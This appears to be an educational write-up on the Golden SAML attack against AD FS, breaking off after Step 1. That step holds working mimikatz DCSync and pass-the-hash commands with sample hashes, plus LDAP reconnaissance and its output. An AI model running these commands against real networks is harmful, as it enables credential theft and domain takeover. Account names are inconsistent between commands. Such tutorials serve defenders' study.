Golden SAML Attack

##
#
https://www.netwrix.com/golden_saml_attack.html
#
https://github.com/cyberark/shimit
#
##

Active Directory
Credential Access
ADFS
Golden SAML is similar in concept to the Golden Ticket technique. The difference is that instead of compromising the Active Directory secret that signs Kerberos tickets, the adversary compromises the secret used to sign the SAML assertions created by Active Directory Federation Services (AD FS), which is frequently used to extend the Active Directory identity to cloud applications.

For a Golden SAML attack, an adversary must first compromise the AD FS service account on the AD FS server. Once authenticated as the AD FS service account, they can use tools such as ADFSDump to extract the required information: 
 • The token signing certificate and its private key
 • The Distributed Key Manager (DKM) key from Active Directory
 • The list of services for which the AD FS server is configured to be an identity provider

THREAT SUMMARY
Target:
AD FS and associated services
Tools:
AAD Internals, ADFSDump, shimit, ADFSpoof, mimikatz
ATT&CK® Tactic:
Credential Access
ATT&CK Technique:
Forge Web Credentials: SAML Tokens
DIFFICULTY
Detection:
Hard
Mitigation:
Medium
Response:
Hard
Attack Tutorial: How the Golden SAML Attack Works

STEP 1
Compromise the AD FS service
An adversary can use any of a number of different methods to compromise the AD FS service. In general, any means of obtaining administrative access to the AD FS server is sufficient. The example below uses a few techniques: LDAP reconnaissance to discover AD FS, DCSync to export the service account’s hashes, and then Pass the Hash (PtH) to gain a session on the AD FS Server as the service account.
Code
# LDAP reconnaissance for AD FS / AADC Items
## ADFS Uses a Host SPN on the service account for the ADFS Service Portal. If the portal is known (ADFS/STS/FS etc.) it can be discovered
Get-ADObject -filter { ServicePrincipalName -contains “*adfs*” -or ServicePrincipalName -contains “*STS*” -or ServicePrincipalName -contains “*FS*” }

## ADFS User/Service/computer Accounts
Get-ADObject -filter { samaccountname -like “*adfs*” -or description -like “*adfs*” -or description -like “*aadc*” }


# Found GMSA Account named adfssvc$
.\mimikatz.exe “lsadump::dcsync /user:adfssvc$”

# Execute PtH 
.\mimikatz.exe “privilege::debug” “sekurlsa::pth /user:aadcsvc$ /domain:domain.local /ntlm:f0f13a15b218cb98d1ada6484e380fe6 /aes256:f66c03bf486b3b5c7c40d526af00d3b89bf2f120a24059a739005a1c17d1d909 /aes128:569afe31a386f460e69e7915895837f8”
Output
# Command 1 #
DistinguishedName                               Name             ObjectClass ObjectGUID
-----------------                                ----              ----------- ----------
CN=ADFS,OU=Servers,DC=domain,DC=local           ADFS             computer   fbf560c9-da5e-42b9-8f80-9c9a37006c9b
CN=MSOL_81f4a7929078,CN=Users,DC=domain,DC=local MSOL_81f4a7929078 user       38348edf-8a4a-400e-83b4-eb88a57b78a7

# Command 2 #
DistinguishedName                                         Name   ObjectClass                     ObjectGUID
-----------------                                         ----    -----------                     ----------
CN=ADFS,OU=Servers,DC=domain,DC=local                     ADFS   computer                       fbf560c9-da5e-42b9…
CN=aadcsvc,CN=Managed Service Accounts,DC=domain,DC=local aadcsvc msDS-GroupManagedServiceAccount f1709f9d-e137-4185.

# Command 3 # 
mimikatz(commandline) # lsadump::dcsync /user:domain\da
[DC] 'domain.local' will be the domain
[DC] 'DC.domain.local' will be the DC server
[DC] 'aadcsvc$ ' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
Object RDN           : DA
--- Output truncated ---
Credentials:
  Hash NTLM: f0f13a15b218cb98d1ada6484e380fe6
--- Output truncated ---
* Primary:Kerberos-Newer-Keys *
    Default Salt : DOMAIN.LOCALDA
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : f66c03bf486b3b5c7c40d526af00d3b89bf2f120a24059a739005a1c17d1d909
      aes128_hmac       (4096) : 569afe31a386f460e69e7915895837f8

# Command 4 #
# New Window Opens for PTH #
